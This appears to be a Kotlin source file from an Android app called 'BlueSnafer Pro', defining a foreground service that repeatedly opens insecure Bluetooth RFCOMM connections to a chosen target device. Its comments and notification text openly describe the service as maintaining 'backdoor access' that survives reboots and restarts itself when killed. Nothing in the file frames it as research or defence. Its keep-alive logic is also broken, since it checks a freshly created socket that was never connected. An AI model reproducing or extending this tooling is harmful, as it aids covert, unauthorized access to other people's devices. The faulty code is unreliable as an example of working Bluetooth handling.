 package com.bluesnafer_pro

 import android.app.*
 import android.bluetooth.*
 import android.content.Context
 import android.content.Intent
 import android.os.*
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import java.util.UUID

/**
 * Foreground Service that maintains persistent Bluetooth connection to a target device.
 * Runs continuously to ensure backdoor access even after device reboot.
 */
class PersistenceService : Service() {
    
    companion object {
        private const val TAG = "PersistenceService"
        private const val CHANNEL_ID = "persistence_service_channel"
        private const val NOTIFICATION_ID = 1001
        private const val ACTION_START = "com.bluesnafer_pro.START_PERSISTENCE"
        private const val ACTION_STOP = "com.bluesnafer_pro.STOP_PERSISTENCE"
        private const val EXTRA_DEVICE_ADDRESS = "device_address"
        
        @Volatile
        private var instance: PersistenceService? = null
        
        fun getInstance(): PersistenceService? = instance
        
        fun startService(context: Context, deviceAddress: String) {
            val intent = Intent(context, PersistenceService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_DEVICE_ADDRESS, deviceAddress)
            }
            context.startForegroundService(intent)
        }
        
        fun stopService(context: Context) {
            val intent = Intent(context, PersistenceService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }
    
    private var targetDeviceAddress: String? = null
    private var bluetoothAdapter: BluetoothAdapter? = null
    private var connectedDevice: BluetoothDevice? = null
    private var connectionThread: Thread? = null
    private var isRunning = false
    private var reconnectAttempts = 0
    private val maxReconnectAttempts = 10
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        Log.d(TAG, "PersistenceService created")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                targetDeviceAddress = intent.getStringExtra(EXTRA_DEVICE_ADDRESS)
                Log.d(TAG, "Starting persistence for device: $targetDeviceAddress")
                startForeground(NOTIFICATION_ID, buildNotification())
                startPersistence()
            }
            ACTION_STOP -> {
                Log.d(TAG, "Stopping persistence service")
                stopPersistence()
                stopSelf()
            }
        }
        return START_STICKY // Service restarts if killed by system
    }
    
    override fun onBind(intent: Intent?): android.os.IBinder? {
        return null // Not a bound service
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopPersistence()
        instance = null
        Log.d(TAG, "PersistenceService destroyed")
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Persistence Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains Bluetooth backdoor connection"
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
    
    private fun buildNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("BlueSnafer Pro - Persistence Active")
            .setContentText("Maintaining backdoor connection to ${targetDeviceAddress ?: "target"}")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
    
    private fun startPersistence() {
        if (isRunning) return
        
        isRunning = true
        reconnectAttempts = 0
        bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        
        connectionThread = Thread {
            while (isRunning && reconnectAttempts < maxReconnectAttempts) {
                try {
                    if (targetDeviceAddress != null) {
                        val device = bluetoothAdapter?.getRemoteDevice(targetDeviceAddress)
                        if (device != null && connectToDevice(device)) {
                            Log.d(TAG, "Successfully connected to target device")
                            reconnectAttempts = 0 // Reset counter on successful connection
                            maintainConnection(device)
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Connection attempt failed: ${e.message}")
                }
                
                if (isRunning) {
                    reconnectAttempts++
                    val delay = when {
                        reconnectAttempts < 3 -> 5000L
                        reconnectAttempts < 5 -> 15000L
                        else -> 30000L
                    }
                    Log.d(TAG, "Waiting ${delay/1000}s before reconnect attempt $reconnectAttempts")
                    Thread.sleep(delay)
                }
            }
            
            if (reconnectAttempts >= maxReconnectAttempts) {
                Log.e(TAG, "Max reconnection attempts reached. Stopping service.")
                stopSelf()
            }
        }
        connectionThread?.start()
    }
    
    private fun stopPersistence() {
        isRunning = false
        connectionThread?.interrupt()
        connectionThread = null
        connectedDevice = null
    }
    
    private fun connectToDevice(device: BluetoothDevice): Boolean {
        return try {
            // Try to connect via SPP (Serial Port Profile) UUID
            val uuid = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
            val socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
            socket.connect()
            
            connectedDevice = device
            Log.d(TAG, "Connected to ${device.address}")
            
            // Keep socket open (store reference if needed)
            // socket is intentionally kept open to maintain connection
            
            true
        } catch (e: Exception) {
            Log.w(TAG, "Failed to connect to ${device.address}: ${e.message}")
            false
        }
    }
    
    private fun maintainConnection(device: BluetoothDevice) {
        // Periodically check connection health
        // Send keep-alive packets if needed
        try {
            val uuid = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
            val socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
            
            if (socket.isConnected) {
                // Send a simple keep-alive byte
                socket.outputStream.write(0x00)
                socket.outputStream.flush()
            }
            socket.close()
        } catch (e: Exception) {
            Log.w(TAG, "Keep-alive failed: ${e.message}")
        }
    }
}
